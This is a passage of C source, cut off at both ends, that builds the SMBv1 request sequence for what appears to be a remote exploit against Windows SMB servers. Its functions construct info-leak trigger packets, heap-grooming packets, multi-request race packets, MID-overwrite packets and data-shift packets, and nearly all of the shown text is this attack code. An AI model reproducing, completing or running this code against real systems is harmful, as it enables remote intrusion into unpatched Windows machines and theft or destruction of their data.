#pragma warning(disable : 6305)
	PVOID pv = NULL;
	PANYPOINTER any = (PANYPOINTER)(&pv);
	SIZE_T alength = 0, wlength = 0, asize = 0, wsize = 0;
	HANDLE heap = GetProcessHeap();

	pv = HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, 0x1000);

	alength += s->Length;
	asize += s->MaximumLength;

	wlength = (alength * sizeof(WCHAR));
	wsize = (alength + sizeof(WCHAR));

	wsprintfW(any->pwpointer, L"%S", s->Buffer);

	if (wlength != wcslen(MAKEPCWSTR(any->pwpointer)))
		wlength = wcslen(any->pwpointer);

	wsize = wlength + sizeof(WCHAR);

	InitUnicodeString(any->pwpointer, u);
	HeapFree(heap, 0, pv);
#pragma warning(pop)
}

void __stdcall ConvertUnicodeToString(UNICODE_STRING* IN u, STRING* IN OUT s)
{
	PVOID pv = NULL;
	PANYPOINTER any = (PANYPOINTER)(&pv);
	SIZE_T wsize = 0, wlength = 0;
	HANDLE heap = GetProcessHeap();

	pv = HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, 0x1000 / 2);

	wlength += u->Length;
	wsize += u->MaximumLength;

	wsprintfA(any->ppointer, "%S", u->Buffer);
	InitString(any->ppointer, s);

	HeapFree(heap, 0, pv);
}

void DumpHex(const void* vdata, DWORD size)
{
	register BYTE* data = (BYTE*)vdata;
	char ascii[17];
	DWORD i = 0, j = 0;

	ascii[16] = '\0';

	for (i = 0; i < size; i++)
	{
		fprintf_s(stdout, "%02X ", MAKEUNSIGNED(data[i]));
		if (((data[i]) >= ' ') && (data[i] <= '~'))
		{
			ascii[i % 16] = *(char*)(data + i);
		}
		else
		{
			ascii[i % 16] = '.';
		}

		if ((i + 1) % 8 == 0 || (i + 1) == size)
		{
			fprintf(stdout, " ");
			if ((i + 1) % 16 == 0)
			{
				fprintf(stdout, "|  %s \n", ascii);

			}
			else if ((i + 1) == size)
			{
				ascii[(i + 1) % 16] = '\0';
				if ((i + 1) % 16 <= 8)
				{
					fprintf(stdout, " ");
				}
				for (j = (i + 1) % 16; j < 16; ++j)
				{
					fprintf(stdout, "   ");
				}
				fprintf(stdout, "|  %s \n", ascii);
			}
		}
	}
}

WORD get_pid(smb_info* i)
{
	return GetUshort(&i->pid);
}

WORD get_uid(smb_info* i)
{
	return GetUshort(&i->uid);
}

WORD get_mid(smb_info* i)
{
	return GetUshort(&i->mid);
}

WORD get_tid(smb_info* i)
{
	return GetUshort(&i->tid);
}

WORD get_fid(smb_info* i)
{
	return GetUshort(&i->fid);
}

WORD get_special_mid(smb_info* i)
{
	return GetUshort(&i->special_mid);
}

WORD get_special_pid(smb_info* i)
{
	return GetUshort(&i->special_pid);
}

void set_pid(smb_info* i, WORD pid)
{
	PutUshort(&i->pid, pid);
}

void set_uid(smb_info* i, WORD uid)
{
	PutUshort(&i->uid, uid);
}

void set_mid(smb_info* i, WORD mid)
{
	PutUshort(&i->mid, mid);
}

void set_tid(smb_info* i, WORD tid)
{
	PutUshort(&i->tid, tid);
}

void set_fid(smb_info* i, WORD fid)
{
	PutUshort(&i->fid, fid);
}

void set_special_mid(smb_info* i, WORD special_mid)
{
	PutUshort(&i->special_mid, special_mid);
}

void set_special_pid(smb_info* i, WORD special_pid)
{
	PutUshort(&i->special_pid, special_pid);
}



PBYTE negotiate_request_packet(BUFFER* IN OUT bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	bwsalloc(bws, NEGOTIATE_PACKET_SIZE);

	cpy(bws->pbdata, NEGOTIATE_PACKET, bws->dwsize);
	h = MAKEPSMB(bws->pbdata + 4);

	if (!cmp(bws->pbdata + 4, "\xFFSMB", 4U))
	{
#ifdef _DEBUG
		errmsg(__FUNCSIG__, __LINE__, *(DWORD*)"\xFFSMB");
#endif // _DEBUG
		return NULL;
	}

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE session_setup_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_SESSIONSETUP_ANDX setup = NULL;
	PREQ_NT_SESSIONSETUP_ANDX setupnt = NULL;

	bwsalloc(bws, SESSION_SETUP_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, SESSION_SETUP_ANDX_PACKET, SESSION_SETUP_ANDX_PACKET_SIZE);

	h = MAKEPSMB(bws->pbdata + 4);
	setup = (PREQ_SESSIONSETUP_ANDX)bws->pbdata + 36;
	setupnt = (PREQ_NT_SESSIONSETUP_ANDX)bws->pbdata + 36;

	if (!cmp(bws->pbdata + 4, "\xFFSMB", 4U))
	{
#ifdef _DEBUG
		errmsg(__FUNCSIG__, __LINE__, *(DWORD*)"\xFFSMB");
#endif // _DEBUG
		return NULL;
	}

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	if (GetUshort(&setupnt->MaxBufferSize) == GetUshort(&setup->MaxBufferSize))
		PutUshort(&setupnt->MaxBufferSize, 4356);
	else
		PutUshort(&setup->MaxBufferSize, 4356);

	return bws->pbdata;
}

PBYTE tree_connect_packet(BUFFER IN OUT* bws, UNICODE_STRING* unc, WORD pid, WORD uid, WORD mid, WORD tid)
{
//#pragma warning(push)
#pragma warning(disable : 6387)
	static ANYPOINTER packetbase, packetbytecount, packetend, uncaddress, svcaddress;
	BYTE tzdata[0x200] = { 0 };
	BUFFER t = { 0 }; //t.dwsize = sizeof(tzdata); t.pbdata = tzdata;
	PREQ_TREE_CONNECT_ANDX param = NULL;
	PSMB_HEADER header = NULL;
	DWORD totalpacketsize = 0, sizeafterbytecount = 0;
	WORD nbtsize = 0;

	bwsalloc(&t, 0x1000);
	cpy(t.pbdata, TREE_CONNECT_ANDX_PACKET, TREE_CONNECT_ANDX_UNC_OFFSET);
	cpy(t.pbdata + TREE_CONNECT_ANDX_UNC_OFFSET, unc->Buffer, unc->MaximumLength);

	header = MAKEPSMB(t.pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_TREE_CONNECT_ANDX)(t.pbdata + SMB_PARAM_OFFSET);


	packetbase.pvpointer = t.pbdata;
	packetbytecount.pvpointer = (&param->Bytecount);
	uncaddress.pvpointer = (t.pbdata + TREE_CONNECT_ANDX_UNC_OFFSET);
	svcaddress.pvpointer = (uncaddress.pbpointer + unc->MaximumLength);

	cpy(svcaddress.pvpointer, TREE_CONNECT_ANDX_SVC, TREE_CONNECT_ANDX_SVC_SIZE);
	packetend.pvpointer = (svcaddress.pbpointer + TREE_CONNECT_ANDX_SVC_SIZE);

	totalpacketsize = (DWORD)(packetend.address - packetbase.address);
	sizeafterbytecount = (packetend.address - packetbytecount.address);
	sizeafterbytecount -= sizeof(WORD);
	PutUshort(&nbtsize, totalpacketsize - 4);

	PutUshort(&param->Bytecount, LOWORD(sizeafterbytecount));

	PutUshort(&header->Pid, pid);
	PutUshort(&header->Uid, uid);
	PutUshort(&header->Mid, mid);
	PutUshort(&header->Tid, tid);

	PutUshort(packetbase.pbpointer + NETBIOS_SIZE_OFFSET, byteswap16(nbtsize));

	bwsalloc(bws, totalpacketsize);
	cpy(bws->pbdata, t.pbdata, totalpacketsize);
	bwsfree(&t);

	return bws->pbdata;
}

PBYTE nt_create_andx_packet(BUFFER IN OUT* bws, WORD rootfid, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_NT_CREATE_ANDX param = NULL;

	bwsalloc(bws, NT_CREATE_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, NT_CREATE_ANDX_PACKET, NT_CREATE_ANDX_PACKET_SIZE);

	h = MAKEPSMB(bws->pbdata + 4);
	param = (PREQ_NT_CREATE_ANDX)(bws->pbdata + 36);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans_dcerpc_bind_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION param = NULL;
	PANYPOINTER p = NULL;
	bwsalloc(bws, TRANS_DCERPC_BIND_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_DCERPC_BIND_PACKET, TRANS_DCERPC_BIND_PACKET_SIZE);

	p = (PANYPOINTER)(&param);
	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	p->pbpointer = bws->pbdata + SMB_PARAM_OFFSET;

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE write_andx_lsarpc_getusername_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_WRITE_ANDX param = NULL;
	static ANYPOINTER p;
	UNICODE_STRING lsarpc = { 0 };

	bwsalloc(bws, WRITE_ANDX_LSARPC_GET_USERNAME_PACKET_SIZE);
	cpy(bws->pbdata, WRITE_ANDX_LSARPC_GET_USERNAME_PACKET, WRITE_ANDX_LSARPC_GET_USERNAME_PACKET_SIZE);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_WRITE_ANDX)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	InitUnicodeString(L"lsarpc", &lsarpc);
	find_memory_pattern(bws, &p, lsarpc.Buffer, lsarpc.Length);
	FreeUnicodeString(&lsarpc);

	return bws->pbdata;
}

PBYTE trans_trigger_first_leak_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION param = NULL;

	bwsalloc(bws, TRANS_FIRST_LEAK_TRIGGER_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_FIRST_LEAK_TRIGGER_PACKET, TRANS_FIRST_LEAK_TRIGGER_PACKET_SIZE);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_TRANSACTION)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	//PutUshort(&h->Pid, );
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans_groom_type_one_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION param = NULL;

	bwsalloc(bws, TRANS_GROOM_PACKET_TYPE_ONE_SIZE);
	cpy(bws->pbdata, TRANS_GROOM_PACKET_TYPE_ONE, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_TRANSACTION)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans_multirequest_type_one_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD* mids, WORD tid)
{
	static BUFFER tmp;
	static ANYPOINTER baseaddress[3];
	PANYPOINTER racebaseaddress = NULL;
	PSMB_HEADER smb[3] = { NULL };
	PREQ_TRANSACTION trans[3] = { NULL };
	DWORD i = 0, numberofsmbs = 3;

	bwsalloc(bws, TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_SIZE);
	cpy(bws->pbdata, TRANS_MULTI_REQUEST_PACKET_TYPE_ONE, bws->dwsize);

	RtlCopyMemory(&tmp, bws, sizeof(BUFFER));
	racebaseaddress = (PANYPOINTER)(&bws->pbdata);

	//find first smb header
	if (!find_memory_pattern(&tmp, baseaddress, "\xFFSMB", 4))
	{
		bwsfree(bws);
		return FALSE;
	}

	//increment the tmp pointer up by the length of "\xFFSMB"
	tmp.pbdata = baseaddress[0].pbpointer + SMB_HEADER_OFFSET;
	//adjust the size accordingly
	tmp.dwsize -= (DWORD)(baseaddress[0].address - racebaseaddress->address);

	for (i = 1; i < numberofsmbs; i++)
	{
		//first we find the smb header of the next smb request
		if (!find_memory_pattern(&tmp, baseaddress + i, "\xFFSMB", 4))
		{
			bwsfree(bws);
			return NULL;
		}

		//then we increment tmp pbyte pointer by the length of "\xFFSMB"
		tmp.pbdata = (baseaddress[i].pbpointer + SMB_HEADER_OFFSET);
		//we have to reset the size value after first smb header is found
		PutUlong(&tmp.dwsize, bws->dwsize);
		//then we correct it by subtracting diffence in current position from starting address
		tmp.dwsize -= (DWORD)(baseaddress[i].address - racebaseaddress->address);
	}

	RtlZeroMemory(&tmp, sizeof(tmp));

	for (i = 0; i < numberofsmbs; i++)
	{
		//subtract 4 from each base address so they point to begining of netbios hdr
		(baseaddress + i)->pbpointer -= SMB_HEADER_OFFSET;
		smb[i] = MAKEPSMB(baseaddress[i].pbpointer + SMB_HEADER_OFFSET);
		trans[i] = (PREQ_TRANSACTION)(baseaddress[i].pbpointer + SMB_PARAM_OFFSET);
		//update the requests user ID
		PutUshort(&smb[i]->Uid, uid);
		//update the requests Tree ID
		PutUshort(&smb[i]->Tid, tid);
	}

	return bws->pbdata;
}

PBYTE trans_multirequest_type_one_number_two_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD* mids, WORD tid)
{
	static BUFFER tmp;
	static ANYPOINTER baseaddress[3];
	PANYPOINTER racebaseaddress = NULL;
	PSMB_HEADER smb[3] = { NULL };
	PREQ_TRANSACTION trans[3] = { NULL };
	DWORD i = 0, numberofsmbs = 3;

	bwsalloc(bws, TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_NUMBER_TWO_SIZE);
	cpy(bws->pbdata, TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_NUMBER_TWO, TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_NUMBER_TWO_SIZE);

	RtlCopyMemory(&tmp, bws, sizeof(tmp));
	racebaseaddress = (ANYPOINTER*)(&bws->pbdata);

	//find the first smb header 
	if (!find_memory_pattern(&tmp, baseaddress, "\xFFSMB", 4))
	{
		bwsfree(bws);
		return NULL;
	}
	//increment the tmp pbyte pointer by the length of smb::Protocol
	tmp.pbdata = baseaddress->pbpointer + SMB_HEADER_OFFSET;
	//subtract the difference btwn current address and the starting address then subtract it from tmp::dwsize
	tmp.dwsize -= (DWORD)(baseaddress->address - racebaseaddress->address);

	for (i = 1; i < numberofsmbs; i++)
	{
		//find next smb header 
		if (!find_memory_pattern(&tmp, baseaddress + i, "\xFFSMB", 4))
		{
			bwsfree(bws);
			return NULL;
		}

		//increment the tmp pbyte pointer by the length of smb::Protocol
		tmp.pbdata = baseaddress[i].pbpointer + SMB_HEADER_OFFSET;
		//overwrite tmp.dwsize with its original value
		PutUlong(&tmp.dwsize, GetUlong(&bws->dwsize));
		//subtract the difference btwn current address and the starting address then subtract it from tmp::dwsize
		tmp.dwsize -= (DWORD)(baseaddress[i].address - racebaseaddress->address);
	}

	RtlZeroMemory(&tmp, sizeof(tmp));

	for (i = 0; i < numberofsmbs; i++)
	{
		baseaddress[i].address -= SMB_HEADER_OFFSET;
		smb[i] = MAKEPSMB(baseaddress[i].pbpointer + SMB_HEADER_OFFSET);
		trans[i] = (PREQ_TRANSACTION)(baseaddress[i].pbpointer + SMB_PARAM_OFFSET);
		PutUshort(&smb[i]->Uid, uid);
		PutUshort(&smb[i]->Tid, tid);
	}
	return bws->pbdata;
}

PBYTE trans_multirequest_type_one_number_three_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	static BUFFER tmp;
	static ANYPOINTER baseaddress[3];
	PANYPOINTER racebaseaddress = NULL;
	PSMB_HEADER smb[3] = { NULL };
	PREQ_TRANSACTION trans[3] = { NULL };
	DWORD i = 0, numberofsmbs = 3;

	bwsalloc(bws, TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_NUMBER_THREE_SIZE);
	cpy(bws->pbdata, TRANS_MULTI_REQUEST_PACKET_TYPE_ONE_NUMBER_THREE, bws->dwsize);

	RtlCopyMemory(&tmp, bws, sizeof(tmp));
	racebaseaddress = (ANYPOINTER*)(&bws->pbdata);

	//get first smb header address
	if (!find_memory_pattern(&tmp, baseaddress, "\xFFSMB", 4))
	{
		bwsfree(bws);
		SetLastError(NT_STATUS_INVALID_SMB);
		return NULL;
	}
	//increment pbdata by the size of smb::Protocol
	tmp.pbdata = (baseaddress->pbpointer + SMB_HEADER_OFFSET);
	//subtract current 
	tmp.dwsize -= (DWORD)(baseaddress->address - racebaseaddress->address);

	for (i = 1; i < numberofsmbs; i++)
	{
		//get the address of the next smb header
		if (!find_memory_pattern(&tmp, baseaddress + i, "\xFFSMB", 4))
		{
			bwsfree(bws);
			SetLastError(NT_STATUS_INVALID_SMB);
			return NULL;
		}
		//increment tmp.pbdata by the size of SMB::Protocol
		tmp.pbdata = baseaddress[i].pbpointer + SMB_HEADER_OFFSET;
		//reset tmp.dwsize value to the original bws size
		PutUlong(&tmp.dwsize, GetUlong(&bws->dwsize));
		//get current offset and subtract from original size value
		tmp.dwsize -= (DWORD)(baseaddress[i].address - racebaseaddress->address);
	}

	RtlZeroMemory(&tmp, sizeof(tmp));

	for (i = 0; i < numberofsmbs; i++)
	{
		baseaddress[i].address -= SMB_HEADER_OFFSET;
		smb[i] = MAKEPSMB(baseaddress[i].pbpointer + SMB_HEADER_OFFSET);
		trans[i] = (PREQ_TRANSACTION)(baseaddress[i].pbpointer + SMB_PARAM_OFFSET);
		PutUshort(&smb[i]->Uid, uid);
		PutUshort(&smb[i]->Tid, tid);
	}

	return bws->pbdata;
}

PBYTE trans_groom_type_two_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION param = NULL;

	bwsalloc(bws, TRANS_GROOM_PACKET_TYPE_TWO_SIZE);
	cpy(bws->pbdata, TRANS_GROOM_PACKET_TYPE_TWO, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_TRANSACTION)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans_secondary_trigger_second_leak_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION_SECONDARY param = NULL;

	bwsalloc(bws, TRANS_SECONDARY_LEAK_TWO_TRIGGER_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_LEAK_TWO_TRIGGER_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_TRANSACTION_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE write_andx_shift_indata_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid, WORD IN fid)
{
	PSMB_HEADER h = NULL;
	PREQ_WRITE_ANDX param = NULL;

	bwsalloc(bws, WRITE_ANDX_INDATA_SHIFT_PACKET_SIZE);
	cpy(bws->pbdata, WRITE_ANDX_INDATA_SHIFT_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_WRITE_ANDX)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	PutUshort(&param->Fid, fid);

	return bws->pbdata;
}

PBYTE trans_secondary_mid_overwrite_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION_SECONDARY param = NULL;

	bwsalloc(bws, TRANS_SECONDARY_MID_OVERWRITE_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_MID_OVERWRITE_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_TRANSACTION_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans_secondary_first_mid_zero_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION_SECONDARY params = NULL;

	bwsalloc(bws, TRANS_SECONDARY_FIRST_MID_ZERO_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_FIRST_MID_ZERO_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	params = (PREQ_TRANSACTION_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans_secondary_first_special_mid_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION_SECONDARY param = NULL;

	bwsalloc(bws, TRANS_SECONDARY_FIRST_SPECIAL_MID_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_FIRST_SPECIAL_MID_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_TRANSACTION_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans_secondary_race_type_one_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	static BUFFER tmp;
	static ANYPOINTER baseaddress[9];
	PANYPOINTER racebaseaddress = NULL;
	PSMB_HEADER smb[9] = { NULL };
	PREQ_TRANSACTION_SECONDARY trans[9] = { NULL };
	DWORD i = 0, numberofsmbs = 9;

	bwsalloc(bws, TRANS_SECONDARY_MULTI_SMB_RACE_TYPE_ONE_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_MULTI_SMB_RACE_TYPE_ONE_PACKET, bws->dwsize);

	RtlCopyMemory(&tmp, bws, sizeof(tmp));
	racebaseaddress = (ANYPOINTER*)(&bws->pbdata);

	for (i = 0; i < numberofsmbs; i++)
	{
		if (!find_memory_pattern(bws, baseaddress, "\xFFSMB", 4))
		{
			bwsfree(bws);
			SetLastError(NT_STATUS_INVALID_SMB);
			return NULL;
		}
		tmp.pbdata = baseaddress[i].pbpointer + SMB_HEADER_OFFSET;
		PutUlong(&tmp.dwsize, GetUlong(&bws->dwsize));
		tmp.dwsize -= (DWORD)(baseaddress[i].address - racebaseaddress->address);
	}

	RtlZeroMemory(&tmp, sizeof(tmp));

	for (i = 0; i < numberofsmbs; i++)
	{
		baseaddress[i].address -= SMB_HEADER_OFFSET;
		smb[i] = MAKEPSMB(baseaddress[i].pbpointer + SMB_HEADER_OFFSET);
		trans[i] = (PREQ_TRANSACTION_SECONDARY)(baseaddress[i].pbpointer + SMB_PARAM_OFFSET);
		PutUshort(&smb[i]->Tid, tid);
		PutUshort(&smb[i]->Uid, uid);
	}

	return bws->pbdata;
}

PBYTE trans_secondary_second_mid_zero_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION_SECONDARY param = NULL;

	bwsalloc(bws, TRANS_SECONDARY_SECOND_MID_ZERO_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_SECOND_MID_ZERO_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_TRANSACTION_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans_secondary_race_type_two_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	static BUFFER tmp;
	static ANYPOINTER baseaddress[4];
	PANYPOINTER racebaseaddress = NULL;
	PSMB_HEADER smb[4] = { NULL };
	PREQ_TRANSACTION_SECONDARY trans[4] = { NULL };
	DWORD i = 0, numberofsmbs = 4;

	bwsalloc(bws, TRANS_SECONDARY_MULTI_SMB_RACE_TYPE_TWO_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_MULTI_SMB_RACE_TYPE_TWO_PACKET, bws->dwsize);

	RtlCopyMemory(&tmp, bws, sizeof(tmp));
	racebaseaddress = (PANYPOINTER)(&bws->pbdata);

	//find first smb header
	if (!find_memory_pattern(&tmp, baseaddress, "\xFFSMB", 4))
	{
		bwsfree(bws);
		return FALSE;
	}

	tmp.pbdata = baseaddress[0].pbpointer + SMB_HEADER_OFFSET;
	tmp.dwsize -= (DWORD)(baseaddress[0].address - racebaseaddress->address);

	//find second smb header
	if (!find_memory_pattern(&tmp, baseaddress + 1, "\xFFSMB", 4))
	{
		bwsfree(bws);
		return FALSE;
	}

	tmp.pbdata = baseaddress[1].pbpointer + SMB_HEADER_OFFSET;
	tmp.dwsize = bws->dwsize;
	tmp.dwsize -= (DWORD)(baseaddress[1].address - racebaseaddress->address);

	//find third smb header
	if (!find_memory_pattern(&tmp, baseaddress + 2, "\xFFSMB", 4))
	{
		bwsfree(bws);
		return FALSE;
	}

	//increase pointer by the size of smb->protocol
	tmp.pbdata = baseaddress[2].pbpointer + SMB_HEADER_OFFSET;
	tmp.dwsize = bws->dwsize;
	tmp.dwsize -= (DWORD)(baseaddress[2].address - racebaseaddress->address);

	if (!find_memory_pattern(&tmp, baseaddress + 3, "\xFFSMB", 4))
	{
		bwsfree(bws);
		return FALSE;
	}

	//reset buffer with size values to 0
	RtlZeroMemory(&tmp, sizeof(tmp));

	//get each smb headers address
	for (i = 0; i < numberofsmbs; i++)
		smb[i] = MAKEPSMB(baseaddress[i].pbpointer);

	//correct each base address to point to each netbios header
	for (i = 0; i < numberofsmbs; i++)
		baseaddress[i].address -= SMB_HEADER_OFFSET;

	//get each SMB_COM_TRANS_SECONDARY's addresses using each base address
	for (i = 0; i < numberofsmbs; i++)
		trans[i] = (PREQ_TRANSACTION_SECONDARY)(baseaddress[i].pbpointer + SMB_PARAM_OFFSET);

	//correct each tree id value
	for (i = 0; i < numberofsmbs; i++)
		PutUshort(&smb[i]->Tid, tid);

	//correct each user id value
	for (i = 0; i < numberofsmbs; i++)
		PutUshort(&smb[i]->Uid, uid);

	return bws->pbdata;
}

PBYTE trans_secondary_third_mid_zero_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION_SECONDARY trans = NULL;

	bwsalloc(bws, TRANS_SECONDARY_THIRD_MID_ZERO_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_THIRD_MID_ZERO_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans_secondary_second_race_type_two_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	static BUFFER tmp;
	static ANYPOINTER baseaddress[4];
	PANYPOINTER racebaseaddress = NULL;
	PSMB_HEADER smb[4] = { NULL };
	PREQ_TRANSACTION_SECONDARY trans[4] = { NULL };
	DWORD i = 0, numberofsmbs = 4;

	bwsalloc(bws, TRANS_SECONDARY_SECOND_MULTI_SMB_RACE_TYPE_TWO_PACKET_SIZE);
	cpy(bws->pbdata, TRANS_SECONDARY_SECOND_MULTI_SMB_RACE_TYPE_TWO_PACKET, bws->dwsize);

	RtlCopyMemory(&tmp, bws, sizeof(tmp));
	racebaseaddress = (PANYPOINTER)(&bws->pbdata);

	//find first smb header
	if (!find_memory_pattern(&tmp, baseaddress, "\xFFSMB", 4))
		return NULL;

	//increment tmp's address of buffer up by the size of smb->protocol 
	//after setting it to the new smb headers base address
	tmp.pbdata = baseaddress[0].pbpointer + SMB_HEADER_OFFSET;
	tmp.dwsize -= (DWORD)(baseaddress[0].address - racebaseaddress->address);

	//find second smb header
	if (!find_memory_pattern(&tmp, baseaddress + 1, "\xFFSMB", 4))
		return NULL;

	//increment tmp's address of buffer up by the size of smb->protocol 
	//after setting it to the new smb headers base address
